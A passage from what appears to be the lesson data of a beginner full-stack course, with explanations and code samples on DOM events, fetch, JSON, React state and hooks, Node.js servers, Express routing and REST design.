        code: `const button = document.getElementById("btn");\nconst title = document.getElementById("title");\n\n// Basic click listener:\nbutton.addEventListener("click", () => {\n  title.textContent = "Button was clicked!";\n  title.style.color = "red";\n});\n\n// Using the event object:\nbutton.addEventListener("click", (event) => {\n  console.log(event.target);        // The button element itself\n  console.log(event.type);          // "click"\n});\n\n// Form submission — prevent page reload:\nconst form = document.querySelector("form");\nform.addEventListener("submit", (event) => {\n  event.preventDefault();           // Stops the page from refreshing\n  const input = document.querySelector("#name-input");\n  console.log("Submitted:", input.value);\n});\n\n// Keyboard event:\ndocument.addEventListener("keydown", (event) => {\n  if (event.key === "Escape") {\n    console.log("Escape pressed!");\n  }\n});\n\n// Mouseover — great for previews:\nbutton.addEventListener("mouseover", () => {\n  button.style.transform = "scale(1.1)";\n});\nbutton.addEventListener("mouseout", () => {\n  button.style.transform = "scale(1)";\n});`,
      },
      {
        heading: 'The Fetch API — getting data from the internet',
        body: `The Fetch API lets your JavaScript make HTTP requests to servers and get data back. This is how your page talks to the outside world. When you see a Twitter feed loading new tweets, a weather widget showing the forecast, or a search bar showing suggestions as you type — that is fetch in action. The basic syntax is fetch("url"). fetch returns a Promise, which is an object representing work that is not done yet. You wait for it to complete with await (inside an async function) or with .then(). The response from fetch is not the actual data — it is an HTTP response object. You call response.json() to extract the JSON data from the response body. The most common pattern is: send a GET request to an API, get back JSON, and use that data to update the DOM. You will do this hundreds of times.`,
        code: '// Fetch data from an API — modern async/await syntax:\nconst loadUsers = async () => {\n  try {\n    const response = await fetch("https://jsonplaceholder.typicode.com/users");\n    const users = await response.json();\n    console.log(users);\n    return users;\n  } catch (error) {\n    console.error("Failed to fetch users:", error);\n  }\n};\n\n// Same thing with .then() syntax (older but widely seen):\nfetch("https://jsonplaceholder.typicode.com/users")\n  .then((response) => response.json())\n  .then((users) => console.log(users))\n  .catch((error) => console.error("Failed:", error));\n\n// async/await is cleaner for complex logic:\nconst loadAndDisplayUsers = async () => {\n  try {\n    const response = await fetch("https://jsonplaceholder.typicode.com/users");\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    const users = await response.json();\n    return users;\n  } catch (error) {\n    console.error("Fetch failed:", error);\n    return [];\n  }\n};',
      },
      {
        heading: 'Displaying fetched data in the DOM',
        body: `Fetching data is only half the work. The other half is showing it on the page. The pattern is: fetch data → create DOM elements for each item → append them to the page. This is where everything from this module comes together. You select a container element (like an empty <div> or <ul>). You fetch data from an API. You loop through the data, creating elements for each item. You set their text content or attributes. You append them to the container. This is the fundamental pattern of dynamic web applications. Every social media feed, every product listing, every dashboard — all built on this same pattern.`,
        code: `<!-- HTML structure: -->\n<ul id="user-list"></ul>\n\n<script>\nconst renderUsers = async () => {\n  const list = document.getElementById("user-list");\n  list.innerHTML = '<li>Loading...</li>';  // Show loading state\n\n  try {\n    const response = await fetch("https://jsonplaceholder.typicode.com/users");\n    const users = await response.json();\n\n    // Clear the loading state:\n    list.innerHTML = "";\n\n    // Create an <li> for each user:\n    users.forEach((user) => {\n      const li = document.createElement("li");\n      li.textContent = \`\${user.name} (\${user.email})\`;\n      li.classList.add("user-item");\n      list.appendChild(li);\n    });\n  } catch (error) {\n    list.innerHTML = '<li class="error">Failed to load users. Try again later.</li>';\n  }\n};\n\nrenderUsers();\n</script>`,
      },
      {
        heading: 'Error handling — what happens when things go wrong?',
        body: `Network requests fail. Servers go down. The user loses internet. Your code must handle these failures gracefully. The fetch function only rejects (throws an error) for network failures — if the user is offline or the server is unreachable. But fetch does NOT reject on HTTP errors like 404 (Not Found) or 500 (Server Error). For those, you must check response.ok (true for status 200-299) and throw your own error. Use try/catch blocks to handle errors. In the catch block, show the user a friendly message — never show raw error text or technical details. A loading state tells the user something is happening. An error state tells the user something went wrong and what they can do about it. These states are not optional. Every dynamic page should handle loading, success, and error states.`,
        code: `const fetchWithErrorHandling = async (url) => {\n  try {\n    const response = await fetch(url);\n\n    // fetch does NOT throw on 404 or 500 — check manually:\n    if (!response.ok) {\n      throw new Error(\`Server returned \${response.status}\`);\n    }\n\n    return await response.json();\n  } catch (error) {\n    // Network error (offline, DNS failure) OR HTTP error:\n    console.error("Fetch error:", error);\n    throw error;  // Re-throw so the caller can handle it\n  }\n};\n\n// Usage with UI states:\nconst displayData = async () => {\n  const container = document.getElementById("data-container");\n  container.textContent = "Loading...";\n\n  try {\n    const data = await fetchWithErrorHandling(\n      "https://jsonplaceholder.typicode.com/posts/1"\n    );\n    container.innerHTML = \`\n      <h2>\${data.title}</h2>\n      <p>\${data.body}</p>\n    \`;\n  } catch (error) {\n    container.innerHTML = \`\n      <p class="error">Could not load data. \n      <button onclick="displayData()">Try again</button></p>\n    \`;\n  }\n};`,
      },
      {
        heading: 'JSON — the language servers and browsers speak',
        body: `JSON stands for JavaScript Object Notation. It is a text format that looks almost exactly like a JavaScript object. Servers send data as JSON. Your fetch gets JSON. You convert it to a JavaScript object with response.json(). JSON has a few rules that are stricter than JavaScript objects: all keys must be in double quotes, all strings must be in double quotes (no single quotes or backticks), and there cannot be trailing commas. You can also convert a JavaScript object back to JSON with JSON.stringify(object). This is used when you send data TO a server (POST requests). JSON has become the universal data format of the web. Almost every API returns JSON. Understanding JSON is essential because you will see it in API documentation, in server responses, and in your browser's DevTools Network tab.`,
        code: `// This is what JSON looks like (what the server sends):\n// {\n//   "userId": 1,\n//   "id": 1,\n//   "title": "Hello World",\n//   "completed": false\n// }\n\n// Convert JSON string to JavaScript object:\nconst jsonString = '{\"name\":\"Ada\",\"age\":28}';\nconst user = JSON.parse(jsonString);\nconsole.log(user.name);  // "Ada"\n\n// Convert JavaScript object to JSON string:\nconst newUser = {\n  name: "Grace",\n  age: 30,\n  role: "developer"\n};\nconst json = JSON.stringify(newUser);\nconsole.log(json);\n// '{\"name\":\"Grace\",\"age\":30,\"role\":\"developer\"}'\n// Notice: keys and strings are now in double quotes\n\n// Sending data to a server (POST):\nfetch("https://api.example.com/users", {\n  method: "POST",\n  headers: {\n    "Content-Type": "application/json"\n  },\n  body: JSON.stringify({\n    name: "Ada",\n    email: "ada@example.com"\n  })\n});`,
      },
      {
        heading: 'Putting it all together — a complete interactive page',
        body: `Here is a complete HTML page that uses everything from this module: DOM selection and manipulation, event listeners, fetch, JSON, and error handling. It is a simple user directory that loads data from an API, displays it in cards, lets you filter by name, and handles loading and error states. Read through every line. Type it out. Run it. Then modify it — change the API endpoint, add more fields to each card, add a sort feature. This is the kind of page you will build constantly as a front-end developer.`,
        code: `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <title>User Directory</title>\n  <style>\n    *, *::before, *::after { box-sizing: border-box; }\n    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }\n    input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }\n    .grid { display: flex; flex-wrap: wrap; gap: 16px; }\n    .card { flex: 1 1 250px; padding: 16px; background: white; border-radius: 8px; border: 1px solid #ddd; }\n    .card h3 { margin: 0 0 4px; }\n    .card p { margin: 0; color: #666; }\n    .loading { text-align: center; color: #666; padding: 40px; }\n    .error { text-align: center; color: red; padding: 40px; }\n  </style>\n</head>\n<body>\n  <h1>User Directory</h1>\n  <input type="text" id="search" placeholder="Search by name...">\n  <div id="container" class="loading">Loading users...</div>\n\n  <script>\n    const container = document.getElementById("container");\n    const searchInput = document.getElementById("search");\n    let allUsers = [];\n\n    const fetchUsers = async () => {\n      try {\n        const response = await fetch("https://jsonplaceholder.typicode.com/users");\n        if (!response.ok) throw new Error("Failed to load");\n        allUsers = await response.json();\n        renderUsers(allUsers);\n      } catch (error) {\n        container.className = "error";\n        container.innerHTML = "Failed to load users. <button onclick='fetchUsers()'>Try again</button>";\n      }\n    };\n\n    const renderUsers = (users) => {\n      if (users.length === 0) {\n        container.className = "loading";\n        container.innerHTML = "No users match your search.";\n        return;\n      }\n      container.className = "grid";\n      container.innerHTML = users.map((user) => {\n        return '<div class=\"card\"><h3>' + user.name + '</h3><p>' + user.email + '</p></div>';\n      }).join("");\n    };\n\n    searchInput.addEventListener("input", () => {\n      const query = searchInput.value.toLowerCase();\n      const filtered = allUsers.filter((user) =>\n        user.name.toLowerCase().includes(query)\n      );\n      renderUsers(filtered);\n    });\n\n    fetchUsers();\n  </script>\n</body>\n</html>`,
      },
    ],
    aiPrompt: `I want to build a simple weather dashboard. Generate a complete HTML page that: fetches data from a free weather API (use https://api.open-meteo.com/v1/forecast?latitude=51.5&longitude=-0.12&current_weather=true for London), displays the current temperature and weather description, handles loading and error states, has a nice card design, and lets me click a button to refresh the data. Explain every part of the code in detail.`,
    terminalMission: `Create an HTML file that fetches a list of posts from https://jsonplaceholder.typicode.com/posts and displays them as cards (title and body truncated to 50 characters). Add an input that filters posts by title as you type. Show "Loading..." while fetching and "Failed to load" on error. Open in browser and verify.`,
  },

  'm3-why-react': {
    pathId: 'full-stack-web',
    title: 'Why frameworks — components, props, JSX',
    duration: '10 min',
    mekLabel: 'enough to understand how React structures webpages and custom props work',
    sections: [
      {
        heading: 'The Problem with Vanilla JS: why manual DOM manipulation gets messy',
        body: 'In Module 2, we built interactive web pages using vanilla JavaScript. We selected elements using document.querySelector, listened to clicks using addEventListener, and modified elements using element.textContent. This works fine for small pages. But imagine building Facebook this way. Every time someone sends a message, likes a post, or changes their profile picture, you would have to write dozens of lines of code to manually search for, update, and insert HTML elements. If you make a mistake in one line, the UI gets out of sync, displaying incorrect notifications or crashing entirely. This style of coding is called imperative — you are giving the browser step-by-step instructions on how to change the page. React was created to solve this. Instead of imperative instructions, React uses a declarative model: you simply describe what the UI should look like based on the current data, and React handles updating the browser automatically.',
        code: '// Imperative (Vanilla JS) — manual updates:\nconst button = document.querySelector("button");\nbutton.addEventListener("click", () => {\n  const list = document.querySelector("ul");\n  const li = document.createElement("li");\n  li.textContent = "New Item";\n  list.appendChild(li);\n});\n\n// Declarative (React concept) — you just describe the items list:\n// React will update the browser when the items list changes.',
      },
      {
        heading: 'What is a Component?',
        body: 'A component is a self-contained, reusable block of code that represents a specific part of a user interface. Think of it like a Lego block. A webpage is built by stacking these blocks together. For example, a search bar, a navigation link, a user card, or an entire sidebar can be written as individual components. In React, a component is simply a JavaScript function that returns what should be rendered on screen. Because they are just functions, components can be reused multiple times with different information, making your code clean, modular, and easy to maintain.',
        code: '// A simple React component represented as a function:\nconst WelcomeHeader = () => {\n  return (\n    <header>\n      <h1>Welcome to VibeSkool!</h1>\n      <p>Your journey into coding starts here.</p>\n    </header>\n  );\n};',
      },
      {
        heading: 'JSX — writing HTML inside JavaScript',
        body: 'You might have noticed that the return statement in the component above looks like HTML inside JavaScript. This is JSX (JavaScript XML). It is a syntax extension that lets us write HTML-like structures directly inside our JavaScript file. Before JSX, writing complex UIs in JavaScript required string concatenation or complex DOM commands. JSX makes code readable and easy to write. Behind the scenes, build tools convert JSX into standard JavaScript function calls that create DOM nodes. A few important rules about JSX: you must return a single root element (often wrapped in a <> empty tag called a React Fragment if you have multiple elements), and some HTML attributes are named differently (for example, class becomes className because class is a reserved keyword in JavaScript).',
        code: '// JSX Rules:\nconst ProductCard = () => {\n  return (\n    // Wrap multiple elements in a fragment <>:\n    <>\n      <div className="product-card"> {/* Note: className instead of class */}\n        <h3>Smart Watch</h3>\n        <p>Price: $199</p>\n      </div>\n    </>\n  );\n};',
      },
      {
        heading: 'Props — customizing your components',
        body: 'If components were completely static, we would have to write a separate component for every single product on our site. Instead, we can customize components using props (short for properties). Props are inputs passed into a component from the outside, similar to how you pass arguments to a JavaScript function. When calling a component, you write props just like HTML attributes. React compiles these attributes into a single object and passes it to your component function as the first parameter. This allows the same component to display different data on different parts of the page.',
        code: '// Defining a component that accepts props:\nconst UserProfile = (props) => {\n  return (\n    <div className="profile-card">\n      <img src={props.avatarUrl} alt={props.name} />\n      <h2>{props.name}</h2>\n      <p>Role: {props.role}</p>\n    </div>\n  );\n};\n\n// Using the component with different props:\n// <UserProfile name="Ada" role="Engineer" avatarUrl="/ada.png" />\n// <UserProfile name="Grace" role="Designer" avatarUrl="/grace.png" />',
        callout: 'Remember: props are read-only! A component should never modify the props it receives. If you need to change data within a component, you use state, which we will cover in the next lesson.',
      },
    ],
    aiPrompt: 'I want a reusable custom Card component in React. Generate the component code. It should accept title, description, imageUrl, and a boolean prop called highlight. If highlight is true, apply a CSS class for a border. Use props and JSX syntax. Include comments explaining how to pass props to it.',
    terminalMission: 'Create a simple React file called Greetings.jsx. Define a Greetings component that accepts props (name and status) and returns a welcome header. Export the component.',
  },

  'm3-state-usestate': {
    pathId: 'full-stack-web',
    title: 'State & the useState hook — re-renders explained',
    duration: '10 min',
    mekLabel: 'enough to manage interactive UI state without confusion',
    sections: [
      {
        heading: "State: a component's memory",
        body: 'In the previous lesson, we learned that props let us customize a component when it is first drawn. But once a component is on the screen, props cannot change. What if the user clicks a button, types in a field, or opens a menu? We need a way for components to store data that changes over time. In React, this is called state. State is a component\'s private, internal memory. While props are passed from parent to child and are read-only, state is managed entirely inside the component and can be updated anytime in response to user actions.',
        code: '// Props vs State:\n// Props = Static configuration passed down (like your eye color).\n// State = Dynamic data managed inside (like what you are currently thinking).',
      },
      {
        heading: 'The useState hook',
        body: 'To add state to a component, React provides a special function called useState. This function is a hook — a built-in helper function that lets you "hook" into React features. When you call useState(initialValue), it returns an array containing exactly two things: 1. The current state value. 2. A setter function to update that value. We use JavaScript array destructuring to give these two elements descriptive names. By convention, if the state is called theme, the setter is called setTheme.',
        code: 'import { useState } from "react";\n\nconst Counter = () => {\n  // Declare state variable "count" starting at 0:\n  const [count, setCount] = useState(0);\n\n  return (\n    <div>\n      <p>You clicked {count} times</p>\n      {/* Update state using the setter function: */}\n      <button onClick={() => setCount(count + 1)}>Click me</button>\n    </div>\n  );\n};',
      },
      {
        heading: 'Re-renders explained: how updates get to screen',
        body: 'Why can\'t we just declare a regular variable like let count = 0 and update it on click? In plain JavaScript, changing a variable does not tell the browser to redraw the screen. In React, the only way to trigger a screen update is by calling the state setter function (e.g. setCount). When you call a setter function, React schedules a re-render. This means React automatically runs your component function again from top to bottom. During this re-run, the component returns the updated JSX reflecting the new state value. React compares this new JSX with the old one, figures out what changed, and updates only the necessary parts of the real DOM. This process of comparing and rendering is fast and invisible to the user.',
        code: '// Incorrect (UI will NOT update):\nconst BadCounter = () => {\n  let count = 0;\n  return <button onClick={() => { count++; }}>Clicked: {count}</button>;\n};\n\n// Correct (UI updates automatically):\nconst GoodCounter = () => {\n  const [count, setCount] = useState(0);\n  return <button onClick={() => setCount(count + 1)}>Clicked: {count}</button>;\n};',
        callout: 'Rule: Never modify state variables directly! Always use the setter function. Writing count = count + 1 bypasses React\'s render engine, leaving the screen out of sync with your data.',
      },
    ],
    aiPrompt: 'Create a ToggleText React component. It should use the useState hook to manage a boolean state variable called showText. Add a button that toggles showText between true and false on click. If showText is true, display a paragraph of text. Explain how re-renders occur when the button is clicked.',
    terminalMission: 'Write a React component that manages a color state. The state should toggle between "light" and "dark" on button click. Display the current color mode in a paragraph.',
  },

  'm3-events-forms': {
    pathId: 'full-stack-web',
    title: 'Events & forms the React way',
    duration: '9 min',
    mekLabel: 'enough to handle user input and form submissions in React',
    sections: [
      {
        heading: 'React Event Handlers',
        body: 'To make our stateful components interactive, we need to respond to user actions like mouse clicks, keyboard inputs, and form submissions. In vanilla JS, we added event listeners. In React, we pass event handlers directly to elements as props. React event props are named in camelCase (like onClick or onChange) instead of lowercase (like onclick or onchange). You pass a function directly as the value of the prop. When the event occurs, React executes this function.',
        code: 'const AlertButton = () => {\n  const handleClick = () => {\n    alert("Button was clicked!");\n  };\n\n  return (\n    // Pass the function name without parentheses () — \n    // otherwise it would run immediately on render:\n    <button onClick={handleClick}>Click me</button>\n  );\n};',
      },
      {
        heading: 'Controlled Components — connecting inputs to state',
        body: 'In standard HTML forms, input elements (like <input> or <textarea>) manage their own text value as the user types. But in React, we want a single source of truth for all data. We do this by creating a Controlled Component. This means we link the input value directly to a state variable. We set the input\'s value attribute to the state variable, and update the state using the onChange event listener as the user types. This keeps the React state and the input element perfectly in sync at all times.',
        code: 'import { useState } from "react";\n\nconst SearchInput = () => {\n  const [query, setQuery] = useState("");\n\n  return (\n    <div>\n      <input \n        type="text"\n        value={query} \n        onChange={(event) => setQuery(event.target.value)} \n        placeholder="Search..."\n      />\n      <p>Searching for: {query}</p>\n    </div>\n  );\n};',
      },
      {
        heading: 'Handling form submissions safely',
        body: 'When a user submits a form, the default browser behavior is to reload the entire page. In modern single-page applications, we want to handle the submit event using JavaScript without refreshing the page. We do this by attaching an onSubmit event listener to the <form> tag, and immediately calling event.preventDefault() inside our handler function. This stops the reload and allows us to validate inputs or send the data to a server asynchronously.',
        code: 'const RegistrationForm = () => {\n  const [username, setUsername] = useState("");\n\n  const handleSubmit = (event) => {\n    event.preventDefault(); // Stop page reload\n    alert(`User registered: ${username}`);\n    // Send data to API here...\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <label>Username:</label>\n      <input \n        type="text" \n        value={username} \n        onChange={(e) => setUsername(e.target.value)} \n      />\n      <button type="submit">Submit</button>\n    </form>\n  );\n};',
        callout: 'Always set type="submit" on the button inside a form. The onSubmit handler should be attached to the <form> element itself, not the click handler of the button, so that keyboard submittal (pressing Enter) works out of the box.',
      },
    ],
    aiPrompt: 'Generate a complete React login form component. It should have email and password inputs controlled by state. Add form validation to display an error message if the email is empty or the password is under 6 characters. Prevent page reload on submit and log the login credentials.',
    terminalMission: 'Create a form with a text input. Bind its value to state. On submit, append the text input value to a list (array state) of items displayed on the page. Prevent default reload behavior.',
  },

  'm3-useeffect': {
    pathId: 'full-stack-web',
    title: 'useEffect & side effects — fetching data on load',
    duration: '9 min',
    mekLabel: 'enough to fetch data when a component mounts and handle loading states',
    sections: [
      {
        heading: 'What is a Side Effect?',
        body: 'So far, our React components have been pure functions that take inputs (props/state) and return outputs (JSX). But real applications need to interact with the outside world. A side effect is any operation that affects things outside the scope of the component function. Common side effects include: fetching data from an external server/API, setting up a timer (like setInterval), or directly editing the document\'s title. React provides a special hook called useEffect to manage these actions safely.',
        code: '// Pure component:\n// Output is strictly based on props/state.\n\n// Component with side effects:\n// Fetches users list from a server and updates state.',
      },
      {
        heading: 'The useEffect Hook and Dependency Array',
        body: 'useEffect takes two arguments: a callback function containing the code for the side effect, and an optional dependency array as the second argument. The dependency array tells React when to re-run your effect function. If you omit the array, the effect runs after every render. If you pass an empty array [], the effect runs exactly once when the component first mounts (loads onto screen). If you pass variables in the array (e.g. [userId]), the effect runs on mount and then re-runs whenever any of those variables change.',
        code: 'import { useEffect, useState } from "react";\n\nconst FetchExample = () => {\n  const [data, setData] = useState([]);\n\n  useEffect(() => {\n    // This code runs only ONCE when the component loads:\n    fetch("https://jsonplaceholder.typicode.com/posts")\n      .then(response => response.json())\n      .then(json => setData(json));\n  }, []); // Empty dependency array = run on load only\n\n  return <ul>{data.slice(0, 3).map(p => <li key={p.id}>{p.title}</li>)}</ul>;\n};',
      },
      {
        heading: 'Managing Loading and Error states in React',
        body: 'When fetching data, the request takes time to complete. During this gap, the page shouldn\'t look broken. We should manage three distinct states: 1. Loading (fetching data), 2. Success (data received), and 3. Error (fetch failed). We do this by declaring loading and error state variables, setting them during the fetch process, and rendering different JSX based on their values.',
        code: 'const UserList = () => {\n  const [users, setUsers] = useState([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    const load = async () => {\n      try {\n        const res = await fetch("https://jsonplaceholder.typicode.com/users");\n        if (!res.ok) throw new Error("Fetch failed");\n        const data = await res.json();\n        setUsers(data);\n      } catch (err) {\n        setError(err.message);\n      } finally {\n        setLoading(false);\n      }\n    };\n    load();\n  }, []);\n\n  if (loading) return <p>Loading users...</p>;\n  if (error)   return <p>Error: {error}</p>;\n  return <ul>{users.map(u => <li key={u.id}>{u.name}</li>)}</ul>;\n};',
        callout: 'Always remember: clean up your side effects! If you set up a timer or a WebSocket subscription inside useEffect, return a cleanup function from your effect callback to clear it when the component unmounts.',
      },
    ],
    aiPrompt: 'I want a React component that fetches a list of products from "https://dummyjson.com/products" on load. Write code managing loading, success, and error states. Use useEffect and useState. Explain what happens during each state transition.',
    terminalMission: 'Create a component that fetches a random joke on load from https://official-joke-api.appspot.com/random_joke and displays the setup and punchline.',
  },

  'm3-composition': {
    pathId: 'full-stack-web',
    title: 'Component composition & project folder structure',
    duration: '8 min',
    mekLabel: 'enough to organise a React project so it scales without pain',
    sections: [
      {
        heading: 'Component Composition — nesting custom components',
        body: 'As your React application grows, writing all your code inside one file is unmaintainable. Instead, we divide our UI into small, specialized components and combine them. This is called composition. In React, we can nest custom components just like standard HTML tags. React gives us a special prop called children that automatically references whatever JSX is placed inside the opening and closing tags of our custom component. This allows us to create reusable wrapper layouts (like a Card or a Sidebar).',
        code: '// A custom Card layout component that wraps other content:\nconst Card = (props) => {\n  return (\n    <div className="card-wrapper">\n      {props.children} {/* Automatically renders nested content */}\n    </div>\n  );\n};\n\n// Using the Card component:\n// <Card>\n//   <h3>Profile Card</h3>\n//   <p>Hello world!</p>\n// </Card>',
      },
      {
        heading: 'Unidirectional data flow and lifting state up',
        body: 'Data in React moves in one direction: from parent to child via props (known as unidirectional data flow). But what if two sibling components need to share the same state? For example, a search input component and a list display component. Since siblings cannot pass props directly to each other, we must lift state up. This means we declare the state in their closest common parent component, and pass the state value and its setter function down to the children as props. When a child triggers the setter, the parent re-renders and passes the updated props to the other child.',
        code: '// Common parent component managing state:\nconst ParentSearchApp = () => {\n  const [query, setQuery] = useState("");\n  return (\n    <>\n      {/* Pass setter to input child, pass value to list child: */}\n      <SearchField query={query} onQueryChange={setQuery} />\n      <ResultsList query={query} />\n    </>\n  );\n};',
      },
      {
        heading: 'Real-world React project folder structure',
        body: 'In a real project (like a Vite template), your files are organized systematically. The main entry point is index.html, which loads main.jsx. main.jsx mounts the root App.jsx component into the DOM. Reusable components are stored inside a /components folder. Each component gets its own file and CSS Module (e.g. Button.jsx and Button.module.css). This modular setup keeps your project clean and understandable even as it grows to hundreds of files.',
        code: '// Typical React Folder Structure:\n// src/\n// ├── components/\n// │   ├── Button.jsx\n// │   ├── Button.module.css\n// │   └── Header.jsx\n// ├── pages/\n// │   ├── DashboardPage.jsx\n// │   └── PathsPage.jsx\n// ├── lib/\n// │   └── store.js\n// ├── App.jsx\n// ├── main.jsx\n// └── index.css',
        callout: 'Keeping each component under 100 lines and in its own file makes it easy for AI coding assistants to modify individual modules without breaking unrelated sections of your code.',
      },
    ],
    aiPrompt: 'I want to build a Parent component containing a Title component and a Button component. When the button is clicked, the parent state changes, which updates the title text. Generate the components code and structure. Explain how state is lifted up.',
    terminalMission: 'Create a reusable Box component that wraps its children inside a div with styling. Render three instances of this component containing different texts.',
  },

  'm4-nodejs-servers': {
    pathId: 'full-stack-web',
    title: 'What a server does — intro to Node.js',
    duration: '9 min',
    mekLabel: 'enough to understand what happens on the machine that responds to your browser',
    sections: [
      {
        heading: 'Client-Server Architecture: crossing the frontend-backend divide',
        body: 'In Module 3, we built interactive React components running entirely inside the user\'s web browser. This is the client side. But where did the React files come from? Where does data go when a user registers? It goes to a server. A server is a remote computer running 24/7 that listens for incoming requests over the internet (like "send me the homepage HTML" or "save this new user profile") and responds with the requested files or data. To build a server, we must write code that runs directly on a computer instead of inside the browser sandbox. This is the backend.',
        code: '// Client (Browser) — Sends a request:\n// GET /index.html -> HTTP Request\n\n// Server (Computer) — Processes and responds:\n// HTTP Response -> HTML/CSS/JS files',
      },
      {
        heading: 'What is Node.js?',
        body: 'Web browsers have built-in engines to read and execute JavaScript. For a long time, JavaScript could only run inside browsers. In 2009, developers extracted the Google Chrome JavaScript engine (called V8) and built Node.js. Node.js is a runtime environment that lets us execute JavaScript code directly on a computer (operating system) outside of any browser. With Node.js, JavaScript became a general-purpose programming language. You can use it to write command-line tools, scripts to organize files on your desktop, and most importantly, web servers.',
        code: '// Run a JavaScript file directly in your terminal:\n// $ node app.js\n\nconsole.log("Hello from Node.js!");\n// This runs in your terminal, not in the browser console.',
      },
      {
        heading: 'Running files and using the CLI',
        body: 'To write Node.js code, you write standard JavaScript in a .js file and run it using the terminal/Command Line Interface (CLI). Node.js provides global variables that are different from the browser. For example, in Node, there is no window or document object because there is no webpage. Instead, you have process (representing the currently running terminal process) and fs (the built-in file system module that lets you create, read, and write files directly on your computer).',
        code: '// Reading a local file using Node\'s built-in file system module:\nimport fs from "fs";\n\n// Read text from a file asynchronously:\nfs.readFile("example.txt", "utf8", (err, data) => {\n  if (err) {\n    console.error("Error reading file:", err);\n    return;\n  }\n  console.log("File content:", data);\n});',
      },
      {
        heading: 'A Barebones Node.js HTTP Server',
        body: 'Node.js has a built-in module called http that allows you to create a web server in just a few lines of code. You call http.createServer, pass a function that receives request (req) and response (res) objects, and tell the server to listen on a specific port (like 3000). Every time a browser visits http://localhost:3000, Node runs your function and sends back a response.',
        code: 'import http from "http";\n\n// Create the server object:\nconst server = http.createServer((req, res) => {\n  // Set the response headers (Content-Type tells browser what it is):\n  res.writeHead(200, { "Content-Type": "text/plain" });\n  \n  // Send the body text back to the client:\n  res.end("Hello from a barebones Node.js server!");\n});\n\n// Tell the server to listen on port 3000:\nserver.listen(3000, () => {\n  console.log("Server is running at http://localhost:3000/");\n});',
        callout: 'A port is like a virtual gate on your computer. Your computer has thousands of ports. By running server.listen(3000), you tell Node to claim port 3000 so any traffic sent there is handled by your script.',
      },
    ],
    aiPrompt: 'Write a basic Node.js script that reads a JSON file named "users.json", parses it into a JavaScript array, filters out users under 18, and writes the filtered array back to a new file named "adults.json". Explain the Node modules used.',
    terminalMission: 'Create a file named basicServer.js. Write a Node.js server using the http module that listens on port 3000. If the request URL is "/about", respond with "About Page", otherwise respond with "Home Page". Run it and verify via browser or curl.',
  },

  'm4-express-api': {
    pathId: 'full-stack-web',
    title: 'Building a simple API with Express — routes, JSON',
    duration: '11 min',
    mekLabel: 'enough to build an API endpoint and understand what AI generates',
    sections: [
      {
        heading: 'Why Backend Frameworks? Introducing Express',
        body: 'Writing a web server using Node\'s built-in http module gets messy quickly. You have to manually write code to parse the URL, check if the request is a GET or POST, extract URL parameters, and handle static files. To make backend development productive, developers use a backend framework. Express is the most popular, minimalist framework for Node.js. It simplifies routing, request parsing, and error handling so you can focus on building features.',
        code: '// Install Express via terminal:\n// $ npm install express',
      },
      {
        heading: 'Routing: GET, POST, paths, and handlers',
        body: 'Routing means directing incoming requests to specific callback functions based on the URL path and HTTP method. Express makes routing highly readable. You define routes using methods on the app object, like app.get("/path", handler) or app.post("/path", handler). The handler function receives req (request) and res (response) objects.',
        code: 'import express from "express";\nconst app = express();\n\n// Handle GET request to homepage:\napp.get("/", (req, res) => {\n  res.send("Welcome to the homepage!");\n});\n\n// Handle GET request to a search API:\napp.get("/api/search", (req, res) => {\n  res.json({ results: ["item1", "item2"] });\n});\n\napp.listen(3000, () => console.log("Express running on port 3000"));',
      },
      {
        heading: 'Request and Response objects: reading and sending data',
        body: 'The req object contains all data sent by the client browser: req.query (variables in the URL after ?), req.params (dynamic URL sections like /users/:id), and req.body (raw data sent in the request payload). The res object has helper methods like res.send (sends text/HTML), res.json (automatically converts objects to JSON and sets headers), and res.status (sets HTTP status codes).',
        code: 'app.get("/api/users/:id", (req, res) => {\n  // Read dynamic URL parameter ":id":\n  const userId = req.params.id;\n  \n  // Send JSON response with a 200 OK status:\n  res.status(200).json({\n    id: userId,\n    name: `User ${userId}`\n  });\n});',
      },
      {
        heading: 'Middlewares: the Express processing pipeline',
        body: 'Middleware functions are helpers that run in sequence between receiving a request and executing your final route handler. They can inspect, modify, or block requests. For example, by default, Express does not know how to parse JSON data sent in a POST request body. We must add the express.json() middleware to enable body parsing across all routes.',
        code: 'const app = express();\n\n// Enable JSON body parsing middleware:\napp.use(express.json());\n\n// Now req.body is populated automatically:\napp.post("/api/feedback", (req, res) => {\n  const message = req.body.message;\n  console.log("Feedback received:", message);\n  res.status(201).json({ status: "success", received: message });\n});',
        callout: 'Middlewares execute in the order they are defined using app.use(). Always put parsing middlewares (like express.json()) at the top of your server file before defining any routes.',
      },
    ],
    aiPrompt: 'Create an Express API for a resource called "quotes". Implement two routes: GET "/api/quotes" (returns a static array of quote objects) and POST "/api/quotes" (adds a new quote to the array and returns the newly added quote with status 201). Include the express.json() middleware.',
    terminalMission: 'Write an Express server that listens on port 3000. Create a GET route "/api/greet" that reads a "name" query parameter (e.g. /api/greet?name=Ada) and returns a JSON greeting like { "greeting": "Hello, Ada!" }.',
  },

  'm4-rest-env': {
    pathId: 'full-stack-web',
    title: 'REST principles & environment variables',
    duration: '9 min',
    mekLabel: 'enough to design clean APIs and keep secrets out of source code',
    sections: [
      {
        heading: 'REST API Design: standardizing your routes',
        body: 'When building APIs, different developers might name paths differently (like /getAllUsers, /user/delete, /createUser). This lack of consistency makes APIs hard to use. REST (Representational State Transfer) is a standard design pattern where URL paths represent resources (nouns like /users, /products, /comments) and HTTP verbs represent actions (GET to read, POST to create, PUT to update, DELETE to remove). REST keeps APIs clean, predictable, and standard.',
        code: '// REST Endpoints for "products":\n// GET    /products      -> Get all products\n// GET    /products/12   -> Get product with ID 12\n// POST   /products      -> Create a new product\n// PUT    /products/12   -> Update product 12\n// DELETE /products/12   -> Delete product 12',
      },
      {
        heading: 'HTTP Verbs in REST APIs',
        body: 'Each HTTP verb maps directly to a specific server action. GET requests must never modify data — they should only fetch. POST is used to submit data, creating a new record. PUT replaces an existing record entirely. DELETE removes it. Express provides routing methods matching each verb: app.get, app.post, app.put, and app.delete.',
